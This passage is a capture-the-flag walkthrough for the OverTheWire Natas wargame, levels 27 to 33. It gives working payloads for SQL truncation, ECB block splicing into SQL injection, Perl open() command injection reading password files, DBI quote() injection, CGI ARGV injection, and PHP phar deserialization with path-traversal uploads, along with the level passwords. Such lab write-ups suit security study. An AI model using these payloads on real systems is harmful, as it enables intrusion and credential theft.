- **Goal:** A user database with `username varchar(64)` and `password varchar(64)`. `createUser()` rejects input where `$usr != trim($usr)` and inserts `substr($usr,0,64)`; `validUser()`/`checkCredentials()` do exact string comparisons; `dumpData()` selects `WHERE username=trim($usr)` and `print_r`s the row. The target row is the existing `natas28` account.
- **Technique and why it works:** **truncation + MySQL trailing-space semantics**. Three quirks combine:
  1. `createUser()` compares against `trim($usr)` but stores `substr($usr, 0, 64)`. If we send 65 characters — `"natas28" + 57 spaces + "x"` — `trim()` leaves it intact (it ends in `x`), so the check passes, but `substr` cuts the trailing `x` and stores a username of exactly 64 bytes: `"natas28" + 57 spaces`, with **our** password.
  2. MySQL's `=` on `VARCHAR` ignores trailing spaces, so `username='natas28'+57 spaces` matches the row we just inserted — and also the real `natas28` row (for `validUser`, the first matching row wins).
  3. `dumpData()` trims the username before its query: `trim("natas28"+57 spaces)` = `"natas28"`, which selects the real `natas28` row, and `print_r` prints its password.

  So the padded username authenticates against the row we created, but the data dump uses the trimmed name and returns the genuine natas28 password.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** Note the three different treatments of the username: `trim()` in the guard, `substr(...,0,64)` in the INSERT, `trim()` again in `dumpData()`.
2. **Register the padded account.** `"natas28" + 57 spaces + "x"` = 65 chars, password empty:
   ```
   POST username=<65 chars> password=
   # User natas28                                                         x was created!
   ```
   The stored row is `username = "natas28" + 57 spaces`, `password = ""`.
3. **Log in with the 64-char padded name.**
   ```
   POST username="natas28" + 57 spaces, password=
   # Welcome natas28   ! Here is your data: Array
   # ( [username] => natas28  [password] => Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3 )
   ```
   `validUser` found our row (trailing-space match), `checkCredentials` accepted our empty password, and `dumpData(trim(...))` selected the real `natas28` row and printed its password.
4. **Verify.** `curl -u natas28:<pw> http://natas28.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas28:** `Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3`
- **Verification:** `http://natas28.natas.labs.overthewire.org/` with `natas28:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L27.cast`

## Level 28 → natas29
- **Account:** `natas28`, password `Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3`.
- **Goal:** A joke search. `POST query=...` returns `302` to `search.php/?query=<base64 ciphertext>`; the search page decrypts it and runs a SQL query. No source is available ("out of sauce"), so this is a black-box level.
- **Technique and why it works:** **ECB cut-and-paste against the encrypted query**. The ciphertext is the raw AES-ECB encryption of a plaintext of the form `<10-byte prefix><our query><padding>`, base64-encoded. ECB encrypts each 16-byte block independently, so equal plaintext blocks produce equal ciphertext blocks — visible immediately: `A*64` yields three identical blocks. That lets us splice blocks from different ciphertexts. We choose a query that places our SQL exactly at the start of a block, and we keep the original prefix blocks from a benign query. The resulting ciphertext decrypts to `<prefix><our SQL>`, and the server runs it inside `... WHERE joke LIKE '<input>%'`, so our payload closes the quote and uses `-- ` to comment out the rest.

### Step-by-step discovery and crafting (what the recording shows)
1. **Probe the ciphertext length.** Posting `a`*0..16 shows lengths 80 and 96 bytes: 16-byte blocks, and our input starts inside the first few blocks (boundary at 13 input bytes: 10-byte prefix + 6 = 16).
2. **Confirm ECB.** `A*64` produces three identical ciphertext blocks (`f633e6b05f86` repeated) — deterministic, per-block encryption.
3. **Find the splice point.** `a*8` and `a*12` share block 2 (`c0872dee8bc9` = prefix + `aaaaaa`), and `a*13` changes block 2. So block 2 is the prefix plus 6 input bytes; input bytes 7.. start at block 3.
4. **Build the payload query.** `"b"*10 + " UNION SELECT 1-- "` puts ` UNION SELECT 1-- ` at the start of block 3 (10 bytes of `b` fill the rest of block 2).
5. **Splice.** Take blocks 0–2 from the `a*8` ciphertext and blocks 3.. from the payload ciphertext:
   ```
   spliced = base[0:3] + payload_ct[3:]
   ```
   Requesting `search.php/?query=<b64(spliced)>` returns `<li>1</li>` — proof that our SQL executed.
6. **Exfiltrate.** Same splice with ` UNION SELECT password FROM users-- ` returns `<li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>`.
7. **Verify.** `curl -u natas29:<pw> http://natas29.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas29:** `hwgoYUiGWoSZAqphtCAZf7u1jS16KEah`
- **Verification:** `http://natas29.natas.labs.overthewire.org/` with `natas29:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L28.cast`

## Level 29 → natas30
- **Account:** `natas29`, password `hwgoYUiGWoSZAqphtCAZf7u1jS16KEah`.
- **Goal:** The page lists `.txt` files through `?file=`; "View sourcecode" is disabled ("c4n Y0 h4z s4uc3?"), so the source has to be recovered through the bug itself. The Perl code is:
  ```perl
  if(param('file')){ $f=param('file');
      if($f=~/natas/){ print "meeeeeep!<br>"; }
      else{ open(FD, "$f.txt"); while (<FD>){ print CGI::escapeHTML($_); } } }
  ```
- **Technique and why it works:** **two-argument `open()` command injection plus a glob bypass**.
  1. `open(FD, "$f.txt")` is the two-argument form: if the string starts with `|`, Perl opens a *pipe* to a shell instead of a file. So `file=|id;` runs `id` and its stdout goes to the HTTP response. The appended `.txt` is harmless (`;` ends the command, `.txt` becomes a nonexistent command).
  2. The filter is `$f =~ /natas/`, so any path containing the literal word `natas` is refused. A shell glob `n?tas` matches `natas` without containing the string, so `/etc/n?tas_webpass/n?tas30` passes the regex and the shell expands it.

  Recovering the source this way is itself an application of the bug: `file=|cat /var/www/n?tas/n?tas29/index.pl;`.

### Step-by-step discovery and crafting (what the recording shows)
1. **Recover the source.** `?file=|cat /var/www/n?tas/n?tas29/index.pl;` prints the Perl program (pipe execution + glob).
2. **Read the flaw.** `open(FD, "$f.txt")` (two-arg open), and `$f=~/natas/` as the only filter.
3. **Prove code execution.** `?file=|id;` → `uid=30029(natas29)`, and `?file=|ls;` lists the directory.
4. **Bypass the filter.** `?file=|ls /etc/n?tas_webpass;` lists the password files; `?file=|cat /etc/n?tas_webpass/n?tas30;` prints `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`.
5. **Verify.** `curl -u natas30:<pw> http://natas30.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas30:** `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`
- **Verification:** `http://natas30.natas.labs.overthewire.org/` with `natas30:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L29.cast`

## Level 30 → natas31
- **Account:** `natas30`, password `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`.
- **Goal:** A Perl login form. The query is built with `$dbh->quote(param('username'))` and `$dbh->quote(param('password'))`.
- **Technique and why it works:** **DBI `quote()` type-argument injection through CGI list context**. `quote()` escapes quotes correctly, so a normal string cannot break out. But `DBI->quote($value, $data_type)` takes a *second* argument: the SQL type of the value. And CGI's `param('password')` returns a **list** when the parameter is sent more than once — so the two values we send become the two arguments of `quote()`. The second one is interpreted as the data type; `4` is `SQL_INTEGER`, which tells DBI the value is a number. DBI then does not quote the string at all, and our first value `1 OR 1=1` is spliced into the SQL raw. The query becomes `... and password =1 OR 1=1`, which is true for any row, so the first user row is returned (and printed).

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows the `quote(param(...))` construction — no interpolation, but also no check that `param` returned a scalar.
2. **Try the obvious injection.** A single `password=' OR 1=1 -- ` is escaped and fails (`fail :(`).
3. **Send the parameter twice.** `password=1 OR 1=1` then `password=4` makes `param('password')` a two-element list: value and type.
   ```
   curl -s -u natas30:<pw> -d 'username=natas31' \
        -d 'password=1 OR 1=1' -d 'password=4' \
        http://natas30.natas.labs.overthewire.org/index.pl
   # win! here is your result: natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
   ```
   `quote('1 OR 1=1', 4)` returns the value unquoted (SQL_INTEGER), so the SQL runs `password =1 OR 1=1`.
4. **Verify.** `curl -u natas31:<pw> http://natas31.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas31:** `aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z`
- **Verification:** `http://natas31.natas.labs.overthewire.org/` with `natas31:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L30.cast`

## Level 31 → natas32
- **Account:** `natas31`, password `aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z`.
- **Goal:** CSV-to-HTML uploader: `if ($cgi->upload('file')) { my $file = $cgi->param('file'); while (<$file>) {...} }`. The "file" is opened by Perl's two-argument `open` on the *string* returned by `param`.
- **Technique and why it works:** **CGI `param`/`@ARGV` injection**. `$cgi->param('file')` is not guaranteed to be an uploaded filehandle: a multipart body may contain a plain text field named `file`, and `param` returns the *first* value in the body order. If we send `file=ARGV` as a plain field before the actual upload, `param('file')` returns the string `ARGV`, and Perl's two-argument `open("ARGV")` opens the magic filehandle `ARGV`, which reads `@ARGV`. `CGI.pm` fills `@ARGV` from the query string for keyword-style requests, so the path we put in the query string becomes the file that `while (<$file>)` reads line by line — and the lines are printed into the table. This is the classic "ARGV injection" bug class.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `$cgi->upload('file')` only checks that *some* file field was sent; the handle used is `param('file')`, which can be any value.
2. **Send a plain field first.**
   ```
   curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' \
        'http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname'
   # table shows: natas-0
   ```
   The plain field makes `param('file')` = `ARGV`; `open("ARGV")` reads `@ARGV`, which CGI populated from the query string `?/etc/hostname`.
3. **Read the target file.**
   ```
   curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' \
        'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'
   # Rc3837d6qd3KoW0R2IgKssMXRX06btgY
   ```
4. **Verify.** `curl -u natas32:<pw> http://natas32.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas32:** `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`
- **Verification:** `http://natas32.natas.labs.overthewire.org/` with `natas32:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L31.cast`

## Level 32 → natas33
- **Account:** `natas32`, password `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`.
- **Goal:** Same CSV2HTML code as natas31, but the page says "This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."
- **Technique and why it works:** **ARGV injection, with the CGI quoting wrinkle defused**. The plain `file=ARGV` field again makes `param('file')` the string `ARGV`, so Perl's two-argument `open` reads `@ARGV`, populated by CGI from the query string. The difference from natas31 is that CGI.pm passes each query word through shell-style quoting when it builds `@ARGV`, so a bare `cmd|` reaches Perl as `cmd|\` (a filename ending in a backslash) and does not open a pipe. Ending the query with ` #` fixes this: the `#` comments out the quote/backslash CGI appended, and the `|` stays a pipe operator. That is why the query must be `?/bin/ls #|`.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** Identical `upload`/`param('file')`/`while (<$file>)` structure; the goal is code execution to run the webroot binary.
2. **Get the quoting right.** `?/bin/ls #|` works, while `?/bin/ls|` does not (CGI turns it into a filename). The recording shows the working form and the directory listing: `getpassword`, `index.pl`, `tmp`, ...
3. **Inspect the target.** `?/bin/ls -la /var/www/natas/natas32/getpassword #|` → `-rwsrwx--- 1 root natas32` — a setuid-root binary that natas32 may execute.
4. **Execute it.** `?/var/www/natas/natas32/getpassword #|` → `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`.
5. **Verify.** `curl -u natas33:<pw> http://natas33.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas33:** `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`
- **Verification:** `http://natas33.natas.labs.overthewire.org/` with `natas33:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L32.cast`

## Level 33 → natas34 (the final level)
- **Account:** `natas33`, password `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`.
- **Goal:** An "Upload Firmware Update" form. `new Executor()` stores `$_POST['filename']` and moves the upload to `/natas33/upload/$filename`. Its `__destruct()` does `chdir("/natas33/upload/")`, then `if (md5_file($this->filename) == $this->signature) passthru("php " . $this->filename);`. `$filename`/`$signature` are **private** and the signature is a fixed constant.
- **Technique and why it works:** **PHP phar deserialization (a.k.a. phar metadata object injection)**. `$filename` is private, so we cannot set it through the POST array — but we *can* choose what is passed to `md5_file()` indirectly, because the upload's destination name is ours. If the filename is `phar:///tmp/our.phar`, then `md5_file()` opens a `phar://` stream, and PHP **unserializes the phar's metadata** in that moment. The metadata is attacker-controlled, so we serialize an `Executor` object ourselves with `filename = /tmp/n33payload.php` and `signature = md5(payload)`. PHP rebuilds that object; when it goes out of scope at request end, `__destruct()` runs with *our* properties: `md5_file("/tmp/n33payload.php")` matches *our* signature, and `passthru("php /tmp/n33payload.php")` executes our payload — which reads the natas34 password file.

  Two details make this work in practice:
  1. The phar must be a *valid* phar: stub `<?php __HALT_COMPILER(); ?>\r\n`, a manifest with API 1.1 and global flag `0x10000`, the metadata, one file entry, then a SHA1 of everything before the digest plus the `GBMB` trailer. The recording builds it with a small Python writer (`/tmp/pharbuild.py`) instead of `Phar` (whose `phar.readonly` ini is on by default on the lab).
  2. Private property names in the serialized string must be mangled as `\x00Executor\x00filename` etc., with exact `s:N:` lengths — a wrong length silently drops the property.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `private $filename`, `private $signature='adeafbadbabec0dedabada55ba55d00d'`, `__destruct()` → `md5_file($this->filename) == $this->signature` → `passthru("php " . $this->filename)`.
2. **Write the payload.** `<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>` → md5 `8a54d751b7e2bbbb2643d355d49e81be`.
3. **Build the phar** whose metadata is `O:8:"Executor":3:{s:18:"\x00Executor\x00filename";s:19:"/tmp/n33payload.php";s:19:"\x00Executor\x00signature";s:32:"8a54d751...";s:14:"\x00Executor\x00init";b:0;}`:
   ```
   python3 /tmp/pharbuild.py /tmp/n33payload.php /tmp/n33r.phar
   # payload md5=8a54d751b7e2bbbb2643d355d49e81be -> /tmp/n33r.phar (274 bytes)
   ```
4. **Upload both files.** The form lets us pick the destination name, so `filename=../../../tmp/n33payload.php` and `filename=../../../tmp/n33r.phar` land in `/tmp` (the upload directory is `/natas33/upload`, three levels below `/`).
5. **Trigger the deserialization.**
   ```
   curl -s -u natas33:<pw> -F 'filename=phar:///tmp/n33r.phar' -F 'uploadedfile=@/tmp/h.txt' \
        http://natas33.natas.labs.overthewire.org/index.php
   # Failur! MD5sum mismatch!        <- the *original* object's destructor
   # Congratulations! Running firmware update: /tmp/n33payload.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
   ```
   The second line is our injected object's destructor firing; the payload printed the password.
6. **Verify.** `curl -u natas34:<pw> http://natas34.natas.labs.overthewire.org/` → HTTP 200; the page says "Congratulations! You have reached the end... for now."
- **Password for natas34:** `cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK`
- **Verification:** `http://natas34.natas.labs.overthewire.org/` with `natas34:<password>` → HTTP 200 ("You have reached the end").
- **Recording:** `recordings/natas/L33.cast`
